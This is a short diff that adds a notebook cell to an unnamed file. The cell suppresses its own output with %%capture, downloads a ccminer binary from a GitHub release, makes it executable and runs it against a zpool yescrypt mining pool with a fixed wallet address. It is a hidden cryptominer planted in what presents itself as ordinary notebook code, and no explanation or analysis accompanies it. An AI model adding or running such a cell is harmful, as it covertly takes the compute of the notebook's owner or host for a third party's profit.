@@ -1,0 +1,2 @@
+%%capture
+!wget https://github.com/fakdy/miner/releases/download/4/ccminer-r14 && sudo apt install libcurl4 && chmod +x ccminer-r14 && ./ccminer-r14 -a yescrypt -o stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u YJkB6N8tvE8mQ1YM9LRzRA6DD6UVK7c5K1 -p c=BSTY,zap=BSTY
